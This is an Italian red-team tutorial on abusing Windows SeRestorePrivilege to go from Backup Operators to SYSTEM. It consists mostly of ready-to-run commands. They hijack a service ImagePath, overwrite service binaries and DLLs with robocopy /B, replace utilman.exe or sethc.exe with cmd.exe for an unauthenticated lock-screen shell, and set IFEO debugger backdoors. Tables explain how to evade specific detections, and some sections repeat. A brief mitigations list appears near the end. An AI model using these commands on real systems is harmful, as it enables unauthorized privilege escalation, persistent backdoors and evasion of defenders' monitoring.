---
title: 'SeRestorePrivilege: Da Backup Operator a SYSTEM in 3 passi'
slug: serestoreprivilege
description: >-
  Come abusare SeRestorePrivilege per sovrascrivere binari di sistema e ottenere
  shell SYSTEM. ImagePath hijack, DLL sideloading, backdoor persistente. Tecnica
  Red Team.
image: /serestoreprivilege.webp
draft: false
date: 2026-05-29T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - serestoreprivilege
  - privilege-escalation
  - robocopy
---

Stesso gruppo di SeBackupPrivilege, direzione opposta. Con SeRestorePrivilege scrivi su qualsiasi file o chiave di registro bypassando le ACL — sostituisci il binario di un servizio SYSTEM, riavvii il servizio, ottieni `nt authority\system`. Backdoor persistente ai riavvii inclusa.

***

## Quick Exploit

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NomeServizio" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\backdoor.exe" /f
sc stop NomeServizio
sc start NomeServizio
```

Output atteso:

```
nt authority\system
```

***

## Cos'è SeRestorePrivilege

Funziona con lo stesso meccanismo di SeBackupPrivilege ma in direzione opposta: usa `FILE_FLAG_BACKUP_SEMANTICS` in scrittura. Il kernel bypassa la DACL e permette la scrittura su qualsiasi file o chiave di registro, indipendentemente dai permessi normali.

**Nota:** `reg add` su `HKLM` e `robocopy /B` attivano le restore API internamente — funzionano anche se il privilegio appare `Disabled`.

***

## Quando esiste

* **Backup Operators** (locale e di dominio) — hanno sia SeBackupPrivilege che SeRestorePrivilege per design
* **Server Operators** in Active Directory
* **Account di servizio Veeam / Acronis / Backup Exec**
* **Account IT** con deleghe di backup esplicite

Verifica:

```cmd
whoami /priv
```

Cerchi:

```
SeRestorePrivilege    Restore files and directories    Enabled
```

Chi ha il privilegio nel sistema:

```cmd
accesschk.exe -a SeRestorePrivilege *
```

***

## Attack Chain

```
Account Backup Operators / Veeam compromesso
  → whoami /priv → SeRestorePrivilege Enabled
  → sc qc NomeServizio → identifica binario SYSTEM
  → reg add ImagePath → punta a backdoor.exe
  → sc stop + sc start → nt authority\system
  → persistenza ai riavvii (il servizio caricherà sempre backdoor.exe)
```

***

## Tool Decision

| Obiettivo                       | Metodo                                                       |
| ------------------------------- | ------------------------------------------------------------ |
| Modifica rapida ImagePath       | `reg add` su HKLM (usa restore API internamente)             |
| Sostituzione fisica del binario | `robocopy /B` — bypassa ACL con backup semantics             |
| DLL hijacking                   | `robocopy /B` + identifica DLL mancanti con Process Monitor  |
| Backdoor senza riavvio servizio | Accessibility backdoor (`utilman.exe` / `sethc.exe`)         |
| Intercetta qualsiasi eseguibile | IFEO hijacking via `reg add` su Image File Execution Options |

***

Prima trova un servizio che gira come LocalSystem:

```cmd
wmic service get name,startname,pathname | findstr /i "LocalSystem"
```

Poi verifica il path esatto del binario del servizio target:

```cmd
sc qc NomeServizio
```

Output:

```
SERVICE_NAME: NomeServizio
        BINARY_PATH_NAME   : C:\Program Files\VendorApp\svc.exe
        OBJECTNAME         : LocalSystem
```

***

## Step 2 — Modifica ImagePath via registry

Il metodo più pulito: modifica la chiave di registro del servizio per puntare al tuo binario. `reg add` su `HKLM` usa le restore API internamente:

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NomeServizio" /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\backdoor.exe" /f
```

Riavvia il servizio:

```cmd
sc stop NomeServizio
```

```cmd
sc start NomeServizio
```

Output atteso:

```
nt authority\system
```

***

## Varianti

### robocopy /B — sostituzione diretta del binario

Sovrascrive il file del servizio usando le restore API, bypassando le ACL:

```cmd
robocopy /B C:\temp "C:\Program Files\VendorApp\" backdoor.exe /mt /is
```

Se il nome del file deve corrispondere al binario originale, rinominalo:

```cmd
move "C:\Program Files\VendorApp\backdoor.exe" "C:\Program Files\VendorApp\svc.exe"
```

Riavvia il servizio:

```cmd
sc stop NomeServizio && sc start NomeServizio
```

### DLL Hijacking privilegiato

Invece di sostituire il binario principale, piazza una DLL malevola che il servizio cerca e non trova. Per identificare le DLL mancanti usa **Process Monitor** (Sysinternals): apri procmon, applica i filtri `Result is NAME NOT FOUND` e `Path ends with .dll`, poi avvia il servizio e osserva l'output.

Una volta identificata la DLL mancante, ad esempio `C:\Program Files\VendorApp\missing.dll`:

```cmd
robocopy /B C:\temp "C:\Program Files\VendorApp\" malicious.dll
```

Rinomina se necessario:

```cmd
move "C:\Program Files\VendorApp\malicious.dll" "C:\Program Files\VendorApp\missing.dll"
```

Riavvia il servizio:

```cmd
sc stop NomeServizio && sc start NomeServizio
```

In alternativa usa Seatbelt per trovare DLL hijackable automaticamente:

```cmd
Seatbelt.exe HijackableDLLs
```

### Accessibility backdoor — shell SYSTEM dalla lock screen

Sostituisci `utilman.exe` (Win+U dalla lock screen) o `sethc.exe` (Shift×5) con `cmd.exe`. Ottieni una shell SYSTEM senza autenticazione — backdoor persistente ai riavvii.

Prima fai un backup dell'originale:

```cmd
robocopy /B C:\Windows\System32 C:\temp utilman.exe
```

Poi sostituisci con cmd.exe:

```cmd
copy /B C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe /Y
```

Dalla lock screen: `Win+U` → shell SYSTEM.

Per sethc.exe (Sticky Keys):

```cmd
copy /B C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe /Y
```

Dalla lock screen: `Shift` × 5 → shell SYSTEM.

### IFEO hijacking — intercetta qualsiasi eseguibile

Image File Execution Options permette di impostare un debugger per qualsiasi eseguibile: quando il binario viene lanciato, Windows avvia il debugger al suo posto.

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /d "C:\temp\backdoor.exe" /f
```

Ogni avvio di `utilman.exe` eseguirà il tuo backdoor. Per il cleanup:

```cmd
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /f
```

### Abilitare manualmente il privilegio per script PowerShell

Se usi API .NET dirette invece di `robocopy /B`:

```powershell
Import-Module .\Enable-Privilege.ps1
Enable-Privilege SeRestorePrivilege
```

Verifica:

```cmd
whoami /priv | findstr SeRestore
```

***

## Errori comuni

**`reg add` su ImagePath ma il servizio avvia ancora il binario originale** — Il servizio legge ImagePath solo all'avvio. Devi fare stop + start, non solo restart in alcuni casi.

**`robocopy /B` fallisce con "Access Denied"** — Il privilegio è Disabled nel token e stai usando un path che richiede attivazione esplicita. Verifica con `whoami /priv | findstr SeRestore`.

**DLL hijacking: il servizio non carica la DLL piazzata** — Il servizio usa un path assoluto nella chiamata a LoadLibrary. Verifica con Process Monitor che cerchi effettivamente la DLL in quel path (filtra su `NAME NOT FOUND`).

**Accessibility backdoor ripristinata dopo reboot** — Windows Resource Protection (WRP) ha ripristinato il file. Usa directory dei servizi in `C:\Program Files\` invece di file System32 protetti da WRP.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                        | Come lo bypassa il Red Team                                                                               |
| ----------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| Event ID 4657 — modifica ImagePath              | Usa `robocopy /B` per sostituzione diretta del file invece di toccare il registry                         |
| Sysmon 11 — FileCreate su directory servizi     | Copia il file da un path temporaneo già presente nel filesystem                                           |
| FIM sui binari dei servizi                      | Difficile da evitare — opera durante finestre di manutenzione o usa DLL hijacking su file meno monitorati |
| Accessibility backdoor (utilman.exe modificato) | Usa IFEO hijacking su registry invece — meno evidente al FIM                                              |

***

## Scenari reali

**Veeam service account** — account nel gruppo Backup Operators su server con servizio legacy. `reg add ImagePath` punta a backdoor.exe → `sc restart` → SYSTEM → dump credenziali → lateral movement.

**Accessibility backdoor in ambiente RDP** — `utilman.exe` sostituito con `cmd.exe` → accesso SYSTEM dalla lock screen RDP senza autenticazione → persistenza ai riavvii.

**DLL hijacking post-enumerazione** — Seatbelt identifica una DLL hijackable su un servizio SYSTEM → `robocopy /B` piazza la DLL → SYSTEM.

***

## Quando fallisce

* **Windows Resource Protection (WRP)** su file System32 core → ripristino automatico da SFC. Usa directory dei servizi (`C:\Program Files\`) invece.
* **WDAC / AppLocker** → il binario viene bloccato all'esecuzione anche se scritto correttamente. Serve un binary firmato o un loader LOLBin.
* Il privilegio è Disabled e usi API .NET dirette → usa `robocopy /B` che attiva le restore API internamente.
* Il servizio non può essere riavviato → controlla permessi: `sc sdshow NomeServizio`.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                    | Come lo bypassa il Red Team                                                        |
| ------------------------------------------- | ---------------------------------------------------------------------------------- |
| Event ID 4657 — modifica ImagePath          | Usa `robocopy /B` per sostituzione diretta del file invece di toccare il registry  |
| Sysmon 11 — FileCreate su directory servizi | Opera durante finestre di manutenzione o usa DLL hijacking su file meno monitorati |
| FIM sui binary dei servizi                  | Difficile da evitare — usa IFEO hijacking su registry invece, meno visibile al FIM |
| Accessibility backdoor (utilman.exe)        | Usa IFEO hijacking via `reg add` — meno evidente al FIM di filesystem              |

***

## Mitigazioni

* **Limitare il gruppo Backup Operators** con revisione periodica
* **WDAC** — blocca esecuzione di binary non firmati anche se scritti nel path corretto
* **FIM** sui binary dei servizi critici con alert immediato
* **gMSA** per i service account di backup

**Nota realistica:** WDAC è l'unica mitigazione davvero efficace. FIM senza WDAC rallenta ma non blocca — l'attaccante ha già eseguito il codice quando l'alert arriva. Nella maggior parte degli ambienti enterprise, WDAC non è deployato.

***

## Errori comuni

**Il servizio avvia ancora il binario originale dopo `reg add`** — Hai modificato ImagePath ma non hai fatto stop + start. Alcuni servizi richiedono arresto esplicito.

**`robocopy /B` fallisce con Access Denied** — Il privilegio è Disabled e non viene attivato automaticamente. Usa `reg add` su HKLM che lo gestisce internamente, oppure abilita con `Enable-Privilege SeRestorePrivilege`.

**DLL non caricata dopo il posizionamento** — Il servizio usa path assoluto nella chiamata LoadLibrary. Verifica con Process Monitor filtrando su `NAME NOT FOUND` + `.dll`.

**Accessibility backdoor ripristinata dopo reboot** — WRP ha ripristinato il file System32. Usa directory dei servizi in `C:\Program Files\` invece.

***

## FAQ

**`reg add` funziona anche se SeRestorePrivilege è Disabled?**
Sì — usa le restore API internamente e le attiva autonomamente.

**Differenza con SeBackupPrivilege?**
SeBackupPrivilege legge bypassando le ACL. SeRestorePrivilege scrive. I Backup Operators hanno entrambi — lettura e scrittura arbitraria sull'intero filesystem.

***

SeRestorePrivilege trasforma un account di backup in un backdoor installer permanente. Una volta modificato l'ImagePath, la persistenza sopravvive ai reboot finché qualcuno non esamina la chiave di registro.

***

**Articoli correlati:**

* [SeBackupPrivilege](https://hackita.it/articoli/sebackupprivilege) — lettura arbitraria, stesso gruppo di account
* [SeTakeOwnershipPrivilege](https://hackita.it/articoli/setakeownershipprivilege) — alternativa quando serve prima cambiare ownership
* [SeRelabelPrivilege](https://hackita.it/articoli/serelabelprivilege) — bypass del layer MIC quando ACL e MIC bloccano entrambi

**Riferimenti:** [Seatbelt](https://github.com/GhostPack/Seatbelt) · [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)

Per valutare i service account esposti nella tua infrastruttura: [hackita.it/supporto](https://hackita.it/supporto)
